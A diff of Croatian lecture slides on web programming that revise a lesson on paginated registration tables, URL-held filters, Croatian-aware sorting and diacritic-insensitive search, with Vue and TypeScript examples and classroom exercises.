@@ -2,7 +2,7 @@
 % !TeX root = predavanje10.tex
 \input{../common/preamble.tex}
 
-\title[Predavanje 10: Tablice i filtri]{Programiranje za web \\ Predavanje 10: Tablice, filtri i administratorsko sučelje}
+\title[Predavanje 10: Tablice i filtri]{Programiranje za web \\ Predavanje 10: Tablice, filtri i radnje organizatora}
 \date{17.12.2026.}
 
 \begin{document}
@@ -15,11 +15,11 @@
   \item Popis koji raste
   \item Sužavanje popisa
   \item Tablica i radnje nad retkom
-  \item Sučelje koje poznaje pravila
+  \item Korisničko sučelje koje poznaje pravila
 \end{enumerate}
 
 \vspace{0.6em}
-Prikaz koji nabraja desetak zapisa i prikaz koji ih nabraja tristo nisu isti posao. Ovo predavanje uređuje drugi od njih.
+Popis od desetak zapisa stane na zaslon i u jedan odgovor, a popis od nekoliko stotina ne stane ni u jedno. Predavanje gradi tablicu koja takav popis prikazuje po dijelovima i nudi samo one radnje koje poslužitelj u tom trenutku dopušta.
 \end{frame}
 
 % ------------------------------------------------------------
@@ -27,487 +27,855 @@ Prikaz koji nabraja desetak zapisa i prikaz koji ih nabraja tristo nisu isti pos
 Nakon ovog predavanja student može:
 
 \begin{itemize}
-  \item dohvatiti popis u dijelovima i ponuditi prijelaz među njima
-  \item odlučiti sužava li se popis na poslužitelju ili u pregledniku
-  \item složiti niz izvedenih vrijednosti od dohvaćenih podataka do prikazanog retka
-  \item zatražiti potvrdu prije radnje koja se ne može poništiti
-  \item prilagoditi ponuđene radnje ulozi korisnika i razdoblju natjecanja
-  \item obrazložiti zašto sučelje koje radnju skriva nije zaštita
+  \itemsep0.2em
+  \item prikazati popis koji raste po stranicama i bez ukupnog broja zapisa odrediti postoji li sljedeća stranica
+  \item zapisati stranicu i filtar u adresu, tako da ih zadrže osvježavanje, tipka Natrag i poslana poveznica
+  \item odlučiti sužava li popis poslužitelj ili preglednik i reći koliki dio popisa svaki obuhvaća
+  \item razvrstati i pretražiti hrvatska imena po pravilima jezika
+  \item ponuditi radnju nad retkom samo kad je dopuštena, a uz onemogućenu navesti razlog
+  \item zatražiti potvrdu prije radnje koja se ne može poništiti, dijalogom koji radi i s tipkovnicom
 \end{itemize}
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Domena primjera}
-Organizator otvara popis prijava na natjecanje. Prijava ima natjecatelja, kategoriju, zbroj i stanje, a klubova je dvadesetak.
+Organizator otvara popis prijava na natjecanje. Na veće natjecanje prijavi se nekoliko stotina natjecatelja iz dvadesetak klubova, a svaka prijava ima natjecatelja, kategoriju, zbroj i stanje.
 
 \vspace{0.9em}
-Isti popis otvara i klub, ali on vidi samo svoje prijave. Razliku provodi poslužitelj, pa je zahtjev s obje strane isti.
+Isti popis otvara i klub, ali vidi samo prijave svojih natjecatelja. Razliku provodi poslužitelj, pa je zahtjev s obje strane isti.
 
 \vspace{0.9em}
-Nad svakim retkom postoje radnje: promjena kategorije, odjava i ponovna prijava. Koja je od njih dopuštena, ovisi o ulozi i o razdoblju u kojem je natjecanje.
+Nad svakim retkom postoje radnje: odjava prijave i povratak odjavljene prijave. Je li radnja dopuštena, ovisi o razdoblju u kojem je natjecanje. Nakon konačnog roka prijave se više ne mijenjaju.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Popis koji vraća sve (I)}
-Prikaz dohvaća prijave i ispisuje ih:
+\begin{frame}[fragile]{Nepotpun popis (I)}
+Organizator otvara prijave na natjecanje na koje se prijavilo tristo natjecatelja. Prikaz šalje zahtjev bez parametara:
 
-\begin{lstlisting}[language=typescript]
-const { data } = await api.get('/competitions/1/registrations/')
-prijave.value = data
+\begin{lstlisting}
+GET /api/competitions/1/registrations/
+200 OK    [ 20 zapisa ]
 \end{lstlisting}
 
 \vspace{0.5em}
-Natjecanje ima tristo prijava. U odgovoru ih stiže dvadeset.
+Poslužitelj bez parametara vraća prvih dvadeset zapisa, što je zadana vrijednost u ovom projektu. Zahtjev nije odbijen i pogreške nema.
 
 \vspace{0.5em}
-Zahtjev nije odbijen i poruke o pogrešci nema. Organizator vidi dvadeset redaka i nema načina doći do ostalih.
+U tablici je dvadeset redaka, a ništa na zaslonu ne kaže da ih ima još dvjesto osamdeset. Prikaz izgleda potpun, a nije.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Popis koji vraća sve (II)}
-Poslužitelj popise vraća u dijelovima. Parametri \texttt{limit} i \texttt{offset} kažu koliko zapisa i od kojeg mjesta; bez njih vrijedi zadanih dvadeset od početka, a najviše se smije tražiti sto.
+\begin{frame}[fragile]{Nepotpun popis (II)}
+Prvi odgovor koji se nameće je zatražiti sve zapise odjednom:
 
-\vspace{0.9em}
-Granica postoji zato što popis raste, a prikaz koji dohvati sve prenosi i drži u memoriji sve, bez obzira na to koliko redaka korisnik pogleda.
+\begin{lstlisting}
+GET /api/competitions/1/registrations/?limit=1000
+422 {"code": "validation_error", ...}
+\end{lstlisting}
 
-\vspace{0.9em}
-Klijent zato mora znati koji dio traži i ponuditi korisniku prijelaz na sljedeći.
+\vspace{0.4em}
+Statusni kod \texttt{422} znači da parametar ne odgovara shemi. Poslužitelj odgovor ograničava namjerno, u ovom projektu na sto zapisa: popis s vremenom raste, a s njim i upit, prijenos i iscrtavanje.
+
+\vspace{0.6em}
+Drugi je odgovor popis dohvaćati u dijelovima i korisniku ponuditi prijelaz među njima. Prikaz tada mora znati koji dio traži i postoji li sljedeći.
+
+\vspace{0.6em}
+Takav se prikaz popisa naziva \textbf{straničenje} (engl. \emph{pagination}).
 \end{frame}
 
 % ============================================================
-\sekcija{Popis koji raste}{Dohvat u dijelovima, prijelaz među dijelovima, podjela posla između poslužitelja i preglednika.}
+\sekcija{Popis koji raste}{Dio popisa zadan parametrima, kraj popisa bez ukupnog broja zapisa, stranica u adresi, prijelaz među stranicama.}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Dohvat u dijelovima}
-\begin{lstlisting}[language=typescript]
-const stranica = ref(0)
-const poVelicini = 20
+\begin{frame}{Dio popisa}
+Katalog knjižnice ne prikazuje sve knjige jednog autora odjednom. Prikaže prvih dvadeset i nudi prijelaz na sljedećih dvadeset. Za sljedeću stranicu katalog treba znati samo koliko je zapisa već prikazao.
 
-async function dohvati() {
-  const { data } = await api.get<Registration[]>(
-    `/competitions/${compId}/registrations/`,
-    { params: { limit: poVelicini, offset: stranica.value * poVelicini } },
-  )
-  prijave.value = data
-}
-
-watch(stranica, dohvati)
-\end{lstlisting}
+\vspace{0.6em}
+API to izražava dvama parametrima: \texttt{limit} kaže koliko zapisa vratiti, a \texttt{offset} koliko ih preskočiti. Uz dvadeset zapisa po stranici:
 
 \vspace{0.4em}
-Promjena stranice mijenja samo \texttt{offset}. Promatrač pokreće novi dohvat, a prikaz pokazuje stanje učitavanja kao i pri prvom otvaranju.
+\begin{center}
+{\small
+\setlength{\tabcolsep}{8pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{2.2cm}L{1.8cm}L{1.8cm}L{3.2cm}@{}}
+  \toprule
+  \textbf{Stranica} & \texttt{limit} & \texttt{offset} & \textbf{Zapisi} \\
+  \midrule
+  1 & 20 & 0  & od 1. do 20. \\
+  2 & 20 & 20 & od 21. do 40. \\
+  3 & 20 & 40 & od 41. do 60. \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.4em}
+Stranica $n$ počinje iza $(n-1)\cdot 20$ preskočenih zapisa. Poredak zapisa zadaje poslužitelj, inače bi isti zapis mogao doći na dvije stranice.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Koliko stranica ima}
-Odgovor je običan niz zapisa i ne nosi ukupan broj. Prikaz zato ne može reći „stranica 3 od 15" ni ponuditi skok na zadnju.
+\begin{frame}[fragile]{Kraj popisa (I)}
+Odgovor je običan niz zapisa, bez ukupnog broja. Prvi odgovor koji se nameće: kraći odgovor od tražene veličine znači da dalje nema zapisa.
 
-\vspace{0.6em}
-Ono što se iz odgovora zna jest je li ovo zadnja stranica: kraći odgovor od tražene veličine znači da dalje nema zapisa.
+\vspace{0.3em}
+Natjecanje ima točno četrdeset prijava:
 
-\begin{lstlisting}[language=typescript]
-const imaJos = computed(() => prijave.value.length === poVelicini)
+\begin{lstlisting}[keepspaces]
+?limit=20&offset=0     20 zapisa    stranica 1, nudi se <@sljedeća@>
+?limit=20&offset=20    20 zapisa    stranica 2, nudi se <@sljedeća@>
+?limit=20&offset=40     0 zapisa    stranica 3 je prazna
 \end{lstlisting}
 
 \vspace{0.4em}
-Ukupan broj tražio bi drugi oblik odgovora, s poljima za zapise i za broj. To je izmjena na poslužitelju, ne u pregledniku.
+Druga stranica je puna kao i prva, pa je prikaz ne razlikuje od stranice iza koje ima još zapisa.
+
+\vspace{0.4em}
+Kad je broj zapisa djeljiv s veličinom stranice, poveznica na sljedeću stranicu vodi na praznu tablicu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Kraj popisa (II)}
+Prikaz treba znati samo postoji li barem jedan zapis iza ove stranice. Do toga podatka vode tri puta:
+
+\vspace{0.5em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.35}
+\begin{tabular}{@{}L{2.6cm}L{4.4cm}L{5.0cm}@{}}
+  \toprule
+  \textbf{Način} & \textbf{Prikaz zna da ima još} & \textbf{Cijena} \\
+  \midrule
+  ukupan broj & šalje ga poslužitelj & drugi upit i promjena API-ja \\
+  kraći odgovor & stiglo je manje od traženog & prazna stranica na kraju popisa \\
+  zapis viška & stigao je zapis više & redak više u svakom odgovoru \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.5em}
+\begin{konvencija}[Izbor, ne pravilo]
+API ovog projekta ne vraća ukupan broj, a izmjena odgovora bila bi izmjena ugovora prema svim klijentima. Projekt zato traži zapis viška.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Zapis viška}
+\begin{lstlisting}[language=typescript]
+// src/lib/pager.ts
+export function pageRequest(page: number, size: number = PAGE_SIZE) {
+  return { limit: size + 1, offset: (page - 1) * size }
+}
+
+export function splitPage<T>(items: T[], size: number = PAGE_SIZE) {
+  return { rows: items.slice(0, size), hasNext: items.length > size }
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Uz četrdeset prijava zahtjev za drugu stranicu glasi \texttt{limit=21\&offset=20}. Stiže dvadeset zapisa, pa treće stranice nema.
+
+\vspace{0.3em}
+Zapis viška se ne prikazuje. To je prvi zapis sljedeće stranice, a stiže ponovno kad se ona otvori. Prikaz zato \texttt{offset} računa od veličine stranice, a ne od \texttt{limit}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Stranica u adresi (I)}
+Organizator je na trećoj stranici popisa. Ako je broj stranice vrijednost koju drži komponenta:
+
+\vspace{0.5em}
+\begin{itemize}
+  \itemsep0.45em
+  \item osvježavanje stranice vraća prikaz na prvu stranicu
+  \item tipka Natrag ne vodi na drugu stranicu, nego izlazi s natjecanja
+  \item poveznica koju organizator pošalje suradniku otvara prvu stranicu
+\end{itemize}
+
+\vspace{0.7em}
+Komponenta svoje vrijednosti drži u memoriji kartice. Preglednik ne zna za njih, pa ih ne pamti u povijesti i ne prenosi u poveznici.
+
+\vspace{0.7em}
+Stanje popisa tako nestaje pri svakom događaju koji prikaz učita iznova.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Stranica u adresi (II)}
+Trgovina na webu kategoriju i stranicu drži u adresi, \texttt{/cipele?velicina=42\&stranica=3}, koju preglednik pamti, dijeli i vraća.
+
+\begin{lstlisting}[language=typescript]
+// src/components/AdminRegistrations.vue
+const page = computed(() => pageFromQuery(route.query.stranica))
+const pageLink = (n: number) => ({
+  query: { ...route.query, stranica: n === 1 ? undefined : n },
+})
+\end{lstlisting}
+
+\begin{lstlisting}[language=typescript]
+// src/lib/pager.ts
+export function pageFromQuery(value: unknown): number {
+  const page = Number(typeof value === 'string' ? value : NaN)
+  return Number.isInteger(page) && page >= 1 ? page : 1
+}
+\end{lstlisting}
+
+\vspace{0.1em}
+Adresu može upisati bilo tko, pa je ona ulaz korisnika. \texttt{?stranica=-3} i \texttt{?stranica=abc} daju prvu stranicu, a ne zahtjev s negativnim \texttt{offset}.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}[fragile]{Prijelaz među stranicama}
 \begin{lstlisting}[language=html]
-<div class="pagination">
-  <button @click="stranica--" :disabled="stranica === 0">
-    Prethodna
-  </button>
-  <span>{{ stranica + 1 }}</span>
-  <button @click="stranica++" :disabled="!imaJos">
-    Sljedeca
-  </button>
-</div>
+<!-- src/components/AdminRegistrations.vue -->
+<nav v-if="page > 1 || current.hasNext" class="pager"
+     aria-label="Stranice prijava">
+  <RouterLink v-if="page > 1" :to="pageLink(page - 1)">
+    Prethodna</RouterLink>
+  <span v-else class="disabled" aria-hidden="true">Prethodna</span>
+  <span aria-current="page">Stranica {{ page }}</span>
+  <!-- <@isto za \enquote{Sljedeća}, uz uvjet current.hasNext@> -->
+</nav>
 \end{lstlisting}
 
-\vspace{0.4em}
-Gumb koji nema kamo voditi ostaje vidljiv i onemogućen. Kad bi se uklanjao, ostatak retka pomicao bi se pri svakoj promjeni stranice.
+\vspace{0.3em}
+Prijelaz je poveznica: svaka stranica ima svoju adresu, koja ulazi u povijest preglednika, pa Natrag vodi na prethodnu stranicu popisa, a stranica se može otvoriti u novoj kartici.
 
-\vspace{0.4em}
-Promjena filtra vraća \texttt{stranica} na nulu. Bez toga korisnik ostaje na trećoj stranici popisa koji sada ima jednu.
+\vspace{0.3em}
+Na prvoj stranici \enquote{Prethodna} je tekst na istom mjestu, da se ostatak retka ne pomiče.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Tko dijeli popis}
-\vspace{0.3em}
-\begin{center}
-{\small
-\setlength{\tabcolsep}{6pt}
-\renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{2.8cm}L{4.1cm}L{4.2cm}@{}}
-  \toprule
-   & \textbf{U pregledniku} & \textbf{Na poslužitelju} \\
-  \midrule
-  Dohvat & sve odjednom & po dijelu \\
-  Prijelaz & bez zahtjeva & jedan zahtjev po stranici \\
-  Granica & memorija preglednika & nema je \\
-  Primjenjivo & dok je zapisa malo & uvijek \\
-  \bottomrule
-\end{tabular}
-}
-\end{center}
+\begin{frame}{Vježba: tri prijave na dvije stranice}
+Polazno stanje je \emph{Zimski kup} bez prijava.
 
 \vspace{0.6em}
-Podjela u pregledniku radi samo dok poslužitelj doista vrati sve, a ovaj ih vraća najviše sto. Zato se popisi dijele na poslužitelju.
-
-\vspace{0.4em}
-Mjesto podjele time slijedi iz ugovora koji API nudi.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Vježba: dvije stranice}
-Prijavljeni ste kao organizator \texttt{admin@plreg.hr}, a na \emph{Zimskom kupu} ima više prijava nego što stane u jedan odgovor.
-
-\vspace{0.8em}
 \begin{enumerate}
-  \itemsep0.4em
-  \item Otvorite popis prijava i u kartici Mreža pogledajte poslani zahtjev.
-  \item Dodajte gumbe za prethodnu i sljedeću stranicu i prijeđite na drugu.
-  \item Usporedite parametre dvaju zahtjeva.
-  \item Postavite \texttt{limit} na \texttt{200} i pošaljite zahtjev iz konzole.
-  \item Vratite se na zadnju stranicu i pogledajte koliko je zapisa stiglo.
+  \itemsep0.35em
+  \item Kao klub \texttt{behemot@plreg.hr} prijavite na \emph{Zimski kup} Anu Horvat u kategoriji \texttt{63} i Ivana Perića u kategoriji \texttt{83}.
+  \item Kao klub \texttt{sokol@plreg.hr} prijavite Marka Babića u kategoriji \texttt{83}.
+  \item U \codefile{src/lib/pager.ts} postavite \texttt{PAGE\_SIZE} na \texttt{2}.
+  \item Kao organizator \texttt{admin@plreg.hr} otvorite \emph{Zimski kup} i u kartici Mreža zabilježite \texttt{limit} i \texttt{offset} zahtjeva za prijave.
+  \item Prijeđite na drugu stranicu, zabilježite iste vrijednosti, pa pritisnite Natrag i osvježite stranicu.
+  \item Vratite \texttt{PAGE\_SIZE} na \texttt{20}.
 \end{enumerate}
 
-\vspace{0.8em}
-Što je poslužitelj odgovorio u četvrtom koraku i kako se iz petoga znalo da dalje nema zapisa?
+\vspace{0.6em}
+Koliko je zapisa stiglo na svaki od dvaju zahtjeva i po čemu je prikaz na drugoj stranici znao da treće nema?
 \end{frame}
 
 % ============================================================
-\sekcija{Sužavanje popisa}{Filtar kao parametar upita, filtar u pregledniku, razvrstavanje i niz izvedenih vrijednosti.}
+\sekcija{Sužavanje popisa}{Filtar koji poslužitelj poznaje, pretraga nad prikazanom stranicom, mjesto filtra, usporedba i razvrstavanje po pravilima jezika.}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Filtar koji poslužitelj poznaje}
-Dio sužavanja API nudi sam. Popis prijava prima parametar \texttt{status}, a popis natjecatelja parametar \texttt{gender}:
+\begin{frame}{Filtar u adresi (I)}
+Filtar po stanju je parametar zahtjeva, pa bira koje zapise poslužitelj vraća. Stoji u adresi, uz stranicu, iz istih razloga kao i ona.
 
-\begin{lstlisting}[language=typescript]
-const stanje = ref<'active' | 'withdrawn' | ''>('')
+\vspace{0.6em}
+Ako svaka promjena filtra, kao i promjena stranice, dodaje korak u povijest preglednika:
 
-const params = computed(() => ({
-  limit: poVelicini,
-  offset: stranica.value * poVelicini,
-  ...(stanje.value ? { status: stanje.value } : {}),
-}))
-\end{lstlisting}
+\vspace{0.3em}
+\begin{itemize}
+  \itemsep0.45em
+  \item tipka Natrag prolazi kroz sve filtre koje je korisnik isprobao
+  \item promjena filtra na trećoj stranici ostavlja korisnika na trećoj stranici kraćeg popisa, koja može biti prazna
+\end{itemize}
 
-\vspace{0.4em}
-Izostavljeni parametar znači da filtra nema, pa se prazna vrijednost ne šalje. Poslana prazna vrijednost ne bi prošla provjeru oblika i zahtjev bi dobio \texttt{422}.
+\vspace{0.6em}
+Uz to, vrijednost koju je netko upisao u adresu, \texttt{?stanje=xyz}, odlazi poslužitelju, a on je odbija s \texttt{422}. Taj kod znači da parametar ne odgovara shemi, pa korisnik vidi pogrešku za popis koji postoji.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Filtar koji poslužitelj ne poznaje}
-Pretraga po prezimenu nije dio ugovora. Nju preglednik radi nad onim što ima:
+\begin{frame}[fragile]{Filtar u adresi (II)}
+\begin{lstlisting}[language=typescript]
+// src/components/AdminRegistrations.vue
+const STATUS_VALUES: RegistrationStatus[] = ['active', 'withdrawn']
+const status = computed<RegistrationStatus | undefined>(() =>
+  STATUS_VALUES.find((s) => s === route.query.stanje),
+)
+function setStatus(value: string) {
+  router.replace({
+    query: { ...route.query, stanje: value || undefined,
+             stranica: undefined },
+  })
+}
+\end{lstlisting}
+
+\vspace{0.1em}
+\texttt{replace} mijenja adresu bez novog koraka u povijesti, a stranica se briše iz adrese, pa popis nakon promjene filtra počinje od prve stranice.
+
+\vspace{0.3em}
+\texttt{status} prihvaća samo poznatu vrijednost. Nepoznata, \texttt{?stanje=xyz}, znači popis bez filtra.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Pretraga nad prikazanom stranicom (I)}
+API nema parametar za ime natjecatelja. Pretragu po imenu zato radi preglednik, nad zapisima koje ima, a to je samo prikazana stranica:
 
 \begin{lstlisting}[language=typescript]
-const upit = ref('')
-
-const suzene = computed(() =>
-  prijave.value.filter((p) =>
-    p.lifter.last_name.toLowerCase()
-      .startsWith(upit.value.toLowerCase()))
+// src/components/AdminRegistrations.vue
+const searched = computed(() =>
+  current.value.rows.filter((r) =>
+    matchesQuery(`${r.lifter.first_name} ${r.lifter.last_name}`,
+                 query.value)),
 )
 \end{lstlisting}
 
-\vspace{0.4em}
-Granica je u tome što preglednik ima samo trenutnu stranicu. Natjecatelj koji odgovara upitu, a stoji na trećoj stranici, neće se pojaviti.
-
-\vspace{0.4em}
-Pretraga nad cijelim popisom traži parametar na poslužitelju, koji bi upit izveo nad bazom.
+\vspace{0.3em}
+Natjecatelj koji odgovara upitu, a stoji na trećoj stranici, ne pojavljuje se. Korisnik koji to ne zna zaključit će da natjecatelja nema.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Gdje filtar pripada}
+\begin{frame}[fragile]{Pretraga nad prikazanom stranicom (II)}
+Granica pretrage zato je napisana uz polje:
+
+\begin{lstlisting}[language=html]
+<!-- src/components/AdminRegistrations.vue -->
+<input id="filter-query" v-model="query" type="search"
+       aria-describedby="filter-query-hint" />
+<p id="filter-query-hint" class="hint">
+  <@Pretražuje samo prikazanu stranicu.@>
+</p>
+\end{lstlisting}
+
+\vspace{0.3em}
+\texttt{aria-describedby} veže tekst uz polje, pa ga čitač zaslona pročita kad polje dobije fokus, a ne samo kad korisnik naiđe na njega.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Mjesto filtra}
 \vspace{0.3em}
 \begin{center}
 {\small
 \setlength{\tabcolsep}{6pt}
-\renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{3.3cm}L{3.8cm}L{4.0cm}@{}}
+\renewcommand{\arraystretch}{1.35}
+\begin{tabular}{@{}L{2.8cm}L{4.6cm}L{4.2cm}@{}}
   \toprule
    & \textbf{Na poslužitelju} & \textbf{U pregledniku} \\
   \midrule
-  Obuhvaća & sve zapise & dohvaćeni dio \\
-  Cijena & zahtjev po promjeni & bez zahtjeva \\
+  Obuhvaća & cijeli popis & prikazanu stranicu \\
+  Cijena & zahtjev pri svakoj promjeni & nijedan zahtjev \\
   Traži & parametar u API-ju & ništa \\
+  U ovom projektu & stanje prijave & ime natjecatelja \\
   \bottomrule
 \end{tabular}
 }
 \end{center}
 
 \vspace{0.6em}
-Filtar koji mijenja koje zapise poslužitelj uopće vraća pripada poslužitelju. Filtar koji samo sužava ono što je već na zaslonu smije ostati u pregledniku.
+Filtar koji bira zapise pripada poslužitelju. Filtar u pregledniku sužava ono što je već na zaslonu, pa je točan samo dok je cijeli popis na zaslonu.
 
 \vspace{0.4em}
-Pogreška koja se teško primijeti: filtar u pregledniku nad popisom podijeljenim na stranice. Korisnik vidi prazan rezultat, a zapis koji traži postoji na drugoj stranici.
+Nad popisom po stranicama filtar u pregledniku daje prazan rezultat za zapis koji postoji na drugoj stranici. Pretraga cijelog popisa traži parametar u API-ju i upit nad bazom.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Razvrstavanje}
-Poredak zapisa na poslužitelju je stalan i popisi ga ne mijenjaju. Razvrstavanje po stupcu zato radi preglednik:
+\begin{frame}[fragile]{Usporedba po pravilima jezika}
+Telefonski imenik Čopa stavlja odmah iza Cvora. Obična usporedba nizova gleda brojčane vrijednosti znakova, a u njima slova s dijakriticima stoje iza svih ostalih:
+
+\vspace{0.4em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{3.6cm}L{3.6cm}L{3.6cm}@{}}
+  \toprule
+  \textbf{Ulaz} & \textbf{Usporedba znakova} & \textbf{Usporedba po jeziku} \\
+  \midrule
+  Duda, Čop, Cvor, Ćosić & Cvor, Duda, Ćosić, Čop & Cvor, Čop, Ćosić, Duda \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
 
 \begin{lstlisting}[language=typescript]
-const stupac = ref<'last_name' | 'category'>('last_name')
-const rastuce = ref(true)
-
-const poredane = computed(() =>
-  [...suzene.value].sort((a, b) => {
-    const k = usporedi(a, b, stupac.value)
-    return rastuce.value ? k : -k
-  })
-)
+// src/lib/sort.ts
+const collator = new Intl.Collator('hr', { sensitivity: 'base' })
+export const compareText = (a: string, b: string): number =>
+  collator.compare(a, b)
 \end{lstlisting}
 
-\vspace{0.4em}
-Kopija popisa nastaje prije razvrstavanja, jer \texttt{sort} mijenja polje nad kojim se poziva. Nad izvornim popisom iz pohrane to bi promijenilo i ono što vide drugi prikazi.
+\vspace{0.1em}
+\texttt{Intl.Collator} uspoređuje po pravilima zadanog jezika, a \texttt{sensitivity: 'base'} ne razlikuje mala i velika slova. Bez njega popis izgleda razvrstano dok se ne pojavi prvo prezime s dijakritikom.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Usporedba koja poznaje dijakritike}
-Tri prezimena razvrstana na dva načina:
+\begin{frame}[fragile]{Pretraga bez dijakritika}
+Korisnik koji tipka na mobitelu bez hrvatske tipkovnice upisuje \texttt{colak}. Usporedba znak po znak u imenu Čolak taj niz ne nalazi.
+
+\begin{lstlisting}[language=typescript]
+// src/lib/sort.ts
+function fold(text: string): string {
+  return text
+    .normalize('NFD')
+    .replace(/\p{M}/gu, '')
+    .replace(/<@đ@>/gi, 'd')
+    .toLowerCase()
+}
+export const matchesQuery = (text: string, query: string): boolean =>
+  fold(text).includes(fold(query.trim()))
+\end{lstlisting}
+
+\vspace{0.2em}
+Unicodeov oblik \texttt{NFD} rastavlja Č na slovo C i kvačicu kao zaseban znak, a \texttt{\textbackslash p\{M\}} hvata takve znakove. Đ nije D s dodanim znakom nego zasebno slovo, pa ga rastavljanje ne dira i zamjenjuje se izričito.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Razvrstavanje kopije}
+Kategorije su tekst, a kao tekst \texttt{"105"} stoji ispred \texttt{"59"}, jer se uspoređuje znak po znak. Metoda \texttt{sort} uz to mijenja polje nad kojim se poziva.
+
+\begin{lstlisting}[language=typescript]
+// src/lib/sort.ts
+function categoryValue(category: string): number {
+  const value = Number.parseFloat(category)
+  return category.endsWith('+') ? value + 0.5 : value
+}
+export function sortRegistrations(rows: Registration[], key: SortKey,
+                                  dir: SortDir): Registration[] {
+  const sign = dir === 'asc' ? 1 : -1
+  return [...rows].sort((a, b) => sign * COMPARE[key](a, b))
+}
+\end{lstlisting}
+
+\vspace{0.2em}
+Kategorija se uspoređuje kao broj, a otvorena kategorija \texttt{120+} stoji iza \texttt{120}. \texttt{[...rows]} pravi kopiju: razvrstavanje izvornog polja promijenilo bi i podatke iz kojih se računaju druge izvedene vrijednosti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Niz izvedenih vrijednosti}
+\begin{center}
+\begin{tikzpicture}[
+  font=\small,
+  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=4pt,minimum height=11mm,minimum width=18mm,align=center},
+  str/.style={-{Stealth[length=2mm]},draw=ink2,thick}
+]
+  \node[kut] (a) at (0,0) {\texttt{data}\\{\scriptsize odgovor}};
+  \node[kut] (b) at (2.75,0) {\texttt{current}\\{\scriptsize stranica}};
+  \node[kut] (c) at (5.5,0) {\texttt{searched}\\{\scriptsize pretraga}};
+  \node[kut] (d) at (8.25,0) {\texttt{shown}\\{\scriptsize poredak}};
+  \node[kut] (e) at (10.8,0) {tablica};
+
+  \draw[str] (a) -- (b);
+  \draw[str] (b) -- (c);
+  \draw[str] (c) -- (d);
+  \draw[str] (d) -- (e);
+
+  \node[font=\scriptsize,color=mutedclr,align=center] at (0,1.05) {poslužitelj};
+  \node[font=\scriptsize,color=mutedclr] at (5.5,1.05) {preglednik, \texttt{computed}};
+  \draw[color=lineclr] (1.5,0.8) -- (1.5,-0.8);
+
+  \node[font=\scriptsize,color=mutedclr,align=center] at (0,-1.15) {stanje, stranica\\iz adrese};
+  \node[font=\scriptsize,color=mutedclr,align=center] at (5.5,-1.15) {upis u polje\\pretrage};
+  \node[font=\scriptsize,color=mutedclr,align=center] at (8.25,-1.15) {klik na\\zaglavlje};
+\end{tikzpicture}
+\end{center}
+
+\vspace{0.5em}
+Svaka vrijednost ovisi o prethodnoj, a ispod je ono što je mijenja. Promjena upita mijenja \texttt{searched}, a time i \texttt{shown}, bez ijednog retka koji ih povezuje.
+
+\vspace{0.4em}
+Promjena stanja ili stranice mijenja adresu, a promatrač nad njima šalje novi zahtjev. Koraci koje izvodi poslužitelj zato stoje na početku niza.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: filtar i pretraga}
+Na \emph{Zimskom kupu} su prijave Ane Horvat i Ivana Perića (klub \texttt{behemot@plreg.hr}) i Marka Babića (klub \texttt{sokol@plreg.hr}).
+
+\vspace{0.6em}
+\begin{enumerate}
+  \itemsep0.35em
+  \item Kao klub \texttt{behemot@plreg.hr} odjavite prijavu Ivana Perića.
+  \item Kao organizator \texttt{admin@plreg.hr} otvorite \emph{Zimski kup}, odaberite stanje \enquote{odjavljene} i prepišite adresu iz trake preglednika.
+  \item Otvorite prepisanu adresu u novoj kartici, pa se vratite u prvu i pritisnite Natrag.
+  \item U adresi zamijenite vrijednost parametra \texttt{stanje} sa \texttt{xyz} i u kartici Mreža pogledajte poslani zahtjev.
+  \item Uz sve prijave upišite u pretragu \texttt{peric}, bez dijakritika.
+\end{enumerate}
+
+\vspace{0.6em}
+Kamo je vodio Natrag u trećem koraku i zašto zahtjev u četvrtom koraku poslužitelj nije odbio?
+\end{frame}
+
+% ============================================================
+\sekcija{Tablica i radnje nad retkom}{Uski zaslon, smjer razvrstavanja u zaglavlju, potvrda prije radnje koja se ne poništava, preuzimanje popisa.}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Tablica na uskom zaslonu}
+Tablica sa šest stupaca na zaslonu mobitela ne stane. Kad preglednik prelomi ćelije, redak se razlije preko nekoliko redaka i stupci se više ne poklapaju.
+
+\begin{lstlisting}[language=html]
+/* src/assets/main.css */
+.table-wrap {
+  overflow-x: auto;
+  /* podloga, obrub i zaobljeni kutovi */
+}
+th, td { padding: 10px 12px; text-align: left; white-space: nowrap; }
+\end{lstlisting}
+
